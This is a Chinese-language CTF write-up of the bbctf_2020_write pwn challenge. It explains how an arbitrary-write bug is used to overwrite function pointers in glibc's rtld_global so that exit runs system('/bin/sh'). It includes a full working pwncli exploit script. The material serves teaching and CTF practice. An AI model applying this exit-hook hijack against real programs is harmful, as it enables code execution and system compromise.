# bbctf_2020_write



### 总结

题目可以任意地址写任意值，但是没有退出，因此可以考虑劫持`rtld_global`结构体中的一些函数指针。

- 利用`exit`函数的两个`hook`，同时观察寄存器状态，构造`system("/bin/sh")`拿`shell`。
- 这里出现的`rtld_global`结构体，可以伪造，可以修改。比如在`house of banana`中就能利用。远程中该结构体的低`2`字节需要爆破一下。两个函数指针的偏移分别为`0xf00`和`0xf08`。

<!-- more -->

### Exp

```python
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def write(addr:int, content:(str, bytes)):
    assert len(content) % 8 == 0, "len error!"
    for i in range(0, len(content), 8):
        p.sendlineafter("(q)uit\n", 'w')
        p.sendlineafter("ptr: ", str(addr + i))
        p.sendlineafter("val: ", str(u64(content[i:i+8])))

libc.address = int16((p.recvline()[6:-1]).decode()) - libc.sym['puts']

stack_addr = int16((p.recvline()[7:-1]).decode())
log_address("libc_base_addr", libc.address)
log_address("stack addr", stack_addr)

rtld_global_addr = libc.address +  0x619060
log_address("rtld_global_addr", rtld_global_addr)

write(rtld_global_addr+0x908, "/bin/sh\x00")
write(rtld_global_addr+0xf00, p64(libc.sym['system']))

p.sendlineafter("(q)uit\n", 'q')
p.interactive()
```

劫持效果如下：

![image-20210821125950510](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210821125950510.png)



![image-20210821130037574](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210821130037574.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-08-21-bbctf-2020-write/  

